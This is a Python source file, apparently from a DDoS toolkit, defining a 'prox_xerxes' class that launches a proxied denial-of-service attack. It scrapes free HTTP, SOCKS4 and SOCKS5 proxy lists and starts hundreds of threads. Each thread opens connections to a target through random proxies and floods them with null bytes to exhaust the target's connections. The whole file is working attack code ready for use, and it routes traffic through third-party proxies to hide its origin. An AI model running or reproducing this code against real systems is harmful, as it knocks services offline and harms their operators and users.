from bane.ddos.utils import *

class prox_xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        scraping_timeout=15,
        p=80,
        threads_daemon=True,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=False,
    ):
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol='socks4',timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol='socks5',timeout=scraping_timeout)
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) > 0:
                        bot_type.append("h")
                    if len(self.socks4list) > 0:
                        bot_type.append("s4")
                    if len(self.socks5list) > 0:
                        bot_type.append("s5")
                    z = random.choice(bot_type)
                    if z == "h":
                        line = random.choice(self.httplist)
                    elif z == "s4":
                        line = random.choice(self.socks4list)
                    elif z == "s5":
                        line = random.choice(self.socks5list)
                    ipp = line.split(":")[0].split("=")[0]
                    pp = line.split(":")[1].split("=")[0]
                    s = socks.socksocket()
                    if z == "h":
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == "s4":
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == "s5":
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == "h":
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    while True:
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send("\x00".encode("utf-8"))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write(
                                    "\r[{}: Voly sent-->{}]     ".format(x, ipp)
                                )
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass
